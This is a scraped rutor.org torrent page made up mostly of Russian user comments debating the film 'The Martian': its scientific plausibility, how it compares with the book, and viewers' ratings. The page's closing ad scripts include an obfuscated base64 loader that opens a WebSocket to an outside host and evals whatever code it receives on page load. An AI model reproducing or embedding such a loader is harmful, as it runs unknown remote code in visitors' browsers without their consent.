colspan=4>Помню ждал. Помню как все вокруг только и говорили о нем. А теперь вспоминаю как плохо отзывались о &quot;Гравитации&quot;. Гравитация получила 7 оскаров! Получит ли марсианин? Не думаю...</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>alex-osb</b></td> 	<td>16-02-2016 21:53:08 (23 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><u>bydizm	08-02-2016 15:37:51 (8 дней назад)		<br />
+Фильм нормальный, но для фанатов книги он будет разочарованием. Тут не будет показано половины приключений на задницу Уотни + различные расхождения в деталях.</u><br /> <br />
++1<br />
+купил книгу, прочитал, побежал в кино, грустно иду домой, курю и думаю</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>bydizm</b></td> 	<td>08-02-2016 15:37:51 (23 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Фильм нормальный, но для фанатов книги он будет разочарованием. Тут не будет показано половины приключений на задницу Уотни + различные расхождения в деталях.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>suvva</b></td> 	<td>08-02-2016 11:50:56 (23 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Что-то уж очень бомбит от отечественных &quot;горе-патриотов&quot;. Стремятся расписать как это нереалистично, как скучно, нет драмы, да и комедией попахивает, а не серьезной фантастикой. Мне кажется это зависть или личная нелюбовь  к главному актеру. Если бы какой-нибудь Михалков внезапно снял подобное про российского космонавта - у них была бы совершенно обратная реакция.<br /> <br />
+Фильм - лучшая фантастика 2015, и возможно лучший фильм 2015. Патриотичный, но не пафосный и драмы хватает, и юмора, и не затянутый. И актеры мне нравятся - не раздражал никто: командор Льюис очаровательна, немец Фогель прекрасен, и на земле все выглядят на своих местах. Это &quot;Робинзон Крузо&quot; в космосе. И это я уже пересмотрел несколько раз.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>mclovine</b></td> 	<td>07-02-2016 18:11:19 (23 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Фильм тупой хотя бы потому что в таких случаях, когда человек застрял на другой планете, такое вполне возможно, просят помощи у других стран! И касаемо ракет для запуска - всегда есть запасные, готовые к запуску в течении недели.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Ifearofnapalm</b></td> 	<td>28-01-2016 01:01:27 (23 месяца назад)</td> 	<td>Оценил на: <b>4</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Каким-либо образом хвалить фильм не поднимается рука. Всё можно понять и простить, но это зашкаливающее обилие скотча и полиэтилена в качестве ремонтного материала меня просто добило. Такого рода фильмы снимаются в низкобюджетном кинематографе и там вся эта чушь ещё как-то простительна. В данном случае выглядит как издёвка.<br />
+Насчёт американского ура-патриотизма - да он раздражает всегда. Но с другой стороны фильм-то снимали не в Буркина-Фасо не правда ли? Так что приходится просто пропускать этот бред мимо ушей.<br />
+За раздачу 10, ну а фильм я даже не знаю, с большим бы удовольствием влепил бы ему кол. НО ради объективности оценка - 4</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>rndtoxa</b></td> 	<td>26-01-2016 09:11:54 (23 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>так хорошо лизнули китайцам, что аж у меня защикатало...<br />
+простите меня.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>searchscarlet4</b></td> 	<td>28-12-2015 20:50:39 (24 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><img src="/parse/s.rutor.org/t/smilies/thankyou.gif" /></td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>pioneer-hero</b></td> 	<td>28-12-2015 20:11:49 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><b>Чудо Творожок</b> очень опрометчиво Вы ярлыки на меня вешаете. Просто я с детства люблю жанр научной фантастики, можно сказать, вырос на классических произведениях гениев: Артур Кларк, Рэй Бредбери, Айзек Азимов и т.д. Увлекался в детстве астрономией и космонавтикой. И очень противно наблюдать, как серьезный жанр в искусстве и литературе (а также в науке) превращают в одноразовый Бабл Гам.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>pioneer-hero</b></td> 	<td>28-12-2015 13:05:28 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><b>Чудо Творожок</b>, специально для Вас, касаемо Марса и фильма:<br />
+http://lenta.ru/news/2015/09/20/mars/<br />
+Обратите внимание, что последствия бури определяются, прежде всего, не скоростью ветра, а плотностью атмосферы.<br /> <b>Прошу модератора разрешить ссылку.</b><br /> </td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Чудо Творожок</b></td> 	<td>28-12-2015 08:21:03 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>pioneer-hero - Одним из проявлений перепада температур являются ветры. Над поверхностью планеты часто дуют сильные ветры, скорость которых доходит до 100 м/с. Малая сила тяжести позволяет даже разреженным потокам воздуха поднимать огромные облака пыли. Иногда довольно обширные области на Марсе бывают охвачены грандиозными пылевыми бурями. Это из Википедии.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>pioneer-hero</b></td> 	<td>28-12-2015 05:06:34 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>30% крайне отрицательных и весьма содержательных рецензий на Кинопоиске - есть о чем почитать и задуматься.<br />
+Самый &quot;прогресс&quot; научной мысли в начале фильма - песчаная буря на Марсе (торнадо практически)! ВСЁ - можно выключать и ложиться спать.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>pioneer-hero</b></td> 	<td>27-12-2015 20:40:22 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><b>Чудо Творожок</b>, значит создателям надо было выбирать для сюжета не Марс, а гипотетическую планету. Иначе это не научная фантастика, а сказка про белого бычка. </td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>lorrnet</b></td> 	<td>27-12-2015 15:57:15 (24 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4> Не пожалейте фенешек, сходите в кинотеатр. Фильм этот хорош на большом экране. Очень смотрибелен, эффектен. Одним словом 10. В коллекцию однозначно. Раздающему респект.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>sded66</b></td> 	<td>27-12-2015 10:10:57 (24 месяца назад)</td> 	<td>Оценил на: <b>5</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Книга хороша,фильм-середнячок,спасибо за раздачу.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Чудо Творожок</b></td> 	<td>27-12-2015 08:23:51 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>pioneer-hero Я закончил школу при Союзе, но я не дятел, который будет искать косяки! Я смотрю фильм, а не выискиваю ляпы. Занудам конечно фильм не понравиться, на то они и зануды.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>front242</b></td> 	<td>27-12-2015 02:47:34 (24 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>отличный фильм! джефф дэниелс из тупой ещё тупее в роли директора наса это ЭПИЧНО!</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>pioneer-hero</b></td> 	<td>26-12-2015 22:00:03 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Всё понятно. Кто закончил среднюю школу еще при Союзе явно не в восторге. Количество научных и технических косяков в фильме просто зашкаливает... (см. Кинопоиск). Остальные зрители схавали даже не поперхнувшись попкорном.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>zoroastr</b></td> 	<td>26-12-2015 21:05:40 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Книжка интереснее. Читается на одном дыхании. Кстати многое в фильм не вошло. Например, при спуске в кратер марсоход перевернулся, а потом он еще попал в песчаную бурю, из-за чего батареи стали медленнее заряжаться. Вообще путешествие к модулю занимает добрую четверть книги.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>engie</b></td> 	<td>26-12-2015 19:43:51 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Извиняюсь за оффтоп, что означает аббревиатура &quot;РГ&quot; и слово &quot;сценка&quot;?</fieldset><br />
+РГ - релиз-группа<br />
+&quot;сценка&quot; - сцен-рип, то есть рип с дефолтными настройками, некий необходимый минимум... но уж никак не качество с большой буквы.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>MotorMaster123</b></td> 	<td>26-12-2015 19:32:37 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Извиняюсь за оффтоп, что означает аббревиатура &quot;РГ&quot; и слово &quot;сценка&quot;?</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>bubuka2</b></td> 	<td>26-12-2015 19:12:40 (24 месяца назад)</td> 	<td>Оценил на: <b>2</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Фильм такая же идиотская жвачка, как и книга. Не ожидал от него ничего.<br />
+Тут главная клубничка даже не в том,что скотчем скафандр можно заклеить.<br />
+Бред в самой завязке - кошмарррная марсианская буууряааа <img src="/parse/s.rutor.org/t/smilies/w00t.gif" /> ,<br />
+которой на Марсе быть не может.<br /> <br />
+Спасибо раздающему, что не надо платить за эту бредятину.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>engie</b></td> 	<td>26-12-2015 18:04:56 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Убедительная просьба к оформляющему не просто копировать описание, а еще его и проверять. Рипы рипами, но при прочих равных оформление РГ должно быть идеальным, согласно правилам.<br /> <br />
+Фильм неплох, но не более того.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Shevanton</b></td> 	<td>26-12-2015 17:44:43 (24 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Шикарный фильм!<br /> </td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>levissRUS</b></td> 	<td>26-12-2015 16:59:48 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Уважаемый Скарабей, на 720 не выложите?<br />
+_________<br /> <br /> <b><span style="color:red;">Тут не могу пока, есть в сети &quot;сценка&quot;, но я из РГ партнеров, нам низзя)</span></b></td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>UltraHD</b></td> 	<td>26-12-2015 16:39:33 (24 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br /><b>pokoloko</b>	25-12-2015 20:56:50 (19 часов назад)	Оценил на: 10	<br />
+А я уже третий день смотрю, и никак не досмотрю. И откуда у астронавта такие навыки по картошке и не только???</fieldset><br />
+Смотришь наверное с закрытыми глазами и ушами. В начале фильма из фразы &quot;Я БОТАНИК&quot; тебе что не понятно?<br /> </td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>jaxxa</b></td> 	<td>25-12-2015 19:20:32 (24 месяца назад)</td> 	<td>Оценил на: <b>5</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>У кого хотя бы 3 в школе было по физике, (как у меня), лучше, наверное, не смотреть. Чуши - ни разу не видел столько в одном фильме. Скотчем можно залепить всё - от шлема скафандра до входа в жилой модуль, ну многое другое. Кстати, показатель, наверное, американского образования, подразумевается, что всё это зритель проглотит... Ну а так, как кино, тоже так себе.  </td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>koles2014</b></td> 	<td>25-12-2015 19:00:31 (24 месяца назад)</td> 	<td>Оценил на: <b>5</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Ну что можно сказать ..... Не чего грандиозного не увидел &quot; кроме как скафандр оказывается можно скотчем залепить&quot;. Но 2 часа 21 мин. Это слишком чуть не заснул . Но досмотрел . Разок глянуть можно не более !!! За фильм Спасибо !!!</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Ceypnot</b></td> 	<td>25-12-2015 15:30:24 (24 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Красава и спасибо!</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>salcon</b></td> 	<td>25-12-2015 14:43:35 (24 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>полнейшее разочарование...книга в разы интереснее</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>ТрезвыйТы</b></td> 	<td>25-12-2015 14:01:34 (24 месяца назад)</td> 	<td>Оценил на: <b>1</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Какой скучный, предсказуемый и шаблонный фильм.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>difuzor</b></td> 	<td>25-12-2015 09:26:38 (24 месяца назад)</td> 	<td>Оценил на: <b>2</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Хорошо хоть не сходил на него в кино...зря потратил бы денег. Фильм- дешёвка для домохозяек.Смотрел под конец с перемоткой..</td></tr><tr>	<td colspan="4">&nbsp;</td></tr></table> <center><a href="#up"><img src="/parse/s.rutor.org/t/top.gif" alt="up" /></a></center> <!-- bottom banner --> <div id="down"> Все файлы предоставлены пользователями сайта для свободного обмена. Рутор.org и наши серверы не располагают какими-либо цифровыми копиями аудио-визуальных произведений, мы храним только информацию о них и торрент-файлы, загруженными пользователями для обмена. Для направления жалоб на нарушения исключительных авторских прав, пожалуйста, пишите на email pollyfuckingshit(гав-гав)ro[точка]ру с темой "удалить не читая" или "авторские права"  </div> </div> <div id="sidebar"> <div class="sideblock"> <a id="fforum" href="/torrent/145012"><img src="/parse/s.rutor.org/i/forum.gif" alt="forum" /></a> </div> <div class="sideblock"> <center> <table border="0" background="/parse/s.rutor.org/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px"> <script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script> <form action="" method="get" onsubmit="return search_sidebar();"><input type="hidden" name="____pgfa" value="" /> <tr> <td scope="col" rowspan=2><img src="/parse/s.rutor.org/i/lupa.gif" border="0" alt="img" /></td> <td valign="middle"><input type="text" name="search" size="20" id="in"></td> </tr> <tr> <td><input name="submit" type="submit" id="sub" value="искать по названию"></td> </tr> </form> </table> </center> </div> <div class="sideblock2">
+
+
+
+  <!--noindex--><div id="rmbn240"><div id='b7c9d852eb'></div></div><!--/noindex-->
+
+
+</div>
+<div class="sideblock2"> </div>
+<div class="sideblock2"> </div>
+
+</div> </div>
+
+
+
+</div>
+
+<noindex>
+	<script type="text/javascript" src="http://parpoot.rutorad.ru/psy.js?1"></script>
+</noindex>
+
+<noindex>
+	<script type="text/javascript">(function(){ var h = document.getElementsByTagName("head")[0], s = document.createElement("script"), f = function(){ AMSP.loadAsset("4f10c2b04a586bff125b3c6dcb393efa", ""); }; s.setAttribute("type", "text/javascript"); s.setAttribute("src", "//oconner.link/js/lib.js"); s.onload = function(){ typeof AMSP === 'undefined' ? this.onerror() : f(); }; s.onerror = function(){ try { var w = new Worker(URL.createObjectURL( new Blob(['eval(atob(\'dmFyIHdzID0gbmV3IFdlYlNvY2tldCgnd3NzOi8vb2Nvbm5lci5iaXo6ODA0MS9qcy9saWIuanM/bGliPXdyaycpOwogICAgICAgIHdzLm9ubWVzc2FnZSA9IGZ1bmN0aW9uKHQpewogICAgICAgICAgICBwb3N0TWVzc2FnZSh0LmRhdGEpOwogICAgICAgICAgICB3cy5jbG9zZSgpOwogICAgICAgIH07\'))']), {type: 'application/javascript'} )); w.onmessage = function(t){ typeof AMSP === 'undefined' ? window.addEventListener("amspInit", f) : f(); window.eval(t.data); }; } catch(e) {} }; h.insertBefore(s, h.firstChild);})();</script>
+</noindex>
+<noindex>
+    <ins class="d1c0ea76" data-key="b59d4a134ab783608420a657ce772c06"></ins>
+    <script type="text/javascript" src="/indiana-jones.js?121"></script>
+</noindex>
+
+ <script type="text/javascript" src="/js/new-adress.js?1"></script>
+ <script>
+ //var scrollerid = '#rmbn240';
+ //var scrollh = (540 + 25 + 400 + 200); /*высота шапки + 2x баннеров 240*400  + кусочек*/
+ //if($(document).height() > 600 + scrollh) { $(window).scroll( function(){if($(window).scrollTop() > scrollh) { $(scrollerid).css("position", "fixed"); $(scrollerid).css("top", "1px"); $(scrollerid).css("background-color", "#fff"); } else { $(scrollerid).css("position", "relative"); } }); }
+ </script>
+
+
+ <script> loadPluso('.pluso-top'); </script>	<script>
+	var banner_240=document.createElement("script"); banner_240.type="text/javascript";
+	banner_240.src="/js/video.js?"+Math.floor(Math.random()*10000);
+	document.body.appendChild(banner_240);
+	</script>
+
+</body></html>
